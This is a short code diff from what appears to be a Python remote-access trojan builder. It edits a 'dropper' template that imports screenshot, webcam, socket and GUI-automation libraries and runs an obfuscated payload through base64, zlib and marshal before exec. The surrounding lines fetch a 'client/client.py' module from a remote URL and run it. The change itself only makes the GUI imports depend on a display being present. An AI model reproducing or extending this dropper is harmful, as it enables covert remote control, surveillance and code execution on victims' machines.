@@ -232,9 +232,15 @@ def create_moduel(url):
   return module
 create_moduel(url+"client/client.py").run(url, file_path)"""
 
-        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,requests,importlib.util,mss,ssl,cv2,pyautogui
+        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,requests,importlib.util,mss,ssl,cv2,os
 from PIL import Image
 from urllib.request import urlopen
+
+if os.environ.get('DISPLAY', '') == '':
+    print("No display found, skipping GUI libraries.")
+else:
+    import pyautogui
+    import mouseinfo
 ssl._create_default_https_context = ssl._create_stdlib_context
 exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2))))}))))
 #{uuid.uuid4()}"""
